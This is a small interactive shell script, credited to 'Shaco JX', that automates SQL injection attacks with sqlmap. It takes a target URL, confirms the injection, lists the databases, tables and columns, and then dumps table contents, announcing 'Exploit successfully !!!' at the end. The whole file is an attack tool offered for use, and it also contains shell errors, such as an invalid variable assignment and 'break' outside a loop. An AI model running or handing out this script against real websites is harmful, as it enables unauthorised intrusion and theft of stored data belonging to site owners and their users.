#!/bin/sh
bre = "=================================="
echo $bre
echo "=      code by Shaco JX          = "
echo "=          sjx SQLi               ="
echo "=  fast exploit SQL injection    ="
echo "=          SQLMAP                ="
echo $bre
echo -n "Enter link SQL injection: "
read link
echo "Testing link SQLi"
sqlmap -u "$link"
echo "You want to continue exploit? (yes/no)"
echo "[1] yes"
echo "[2] no"
echo -n "your choice: "
read choice

case $choice in
    1)
        echo "exploiting..."
        break
        ;;
    2)
        echo "exit"
        break
        exit
        ;;
    *)
        echo "Please run and enter agian!"
        break
        exit
        ;;
esac

echo "Get databases"
sqlmap -u "$link" --dbs
echo "Get tables"
echo -n "Enter name database: "
read data
sqlmap -u "$link" -D $data --tables
echo "Get columns"
echo -n "Enter name table: "
read table
sqlmap -u "$link" -D $data -T $table --columns

echo "You want to dump value? (yes/no)"
echo "[1] yes"
echo "[2] no"
echo -n "your choice: "
read choice2

case $choice2 in
    1)
        echo "dumping..."
        break
        ;;
    2)
        echo "exit"
        break
        exit
        ;;
    *)
        echo "Please run and enter agian!"
        break
        exit
        ;;
esac

echo "Dump value"
sqlmap -u "$link" -D $data -T $table --dump
echo "Exploit successfully !!!"

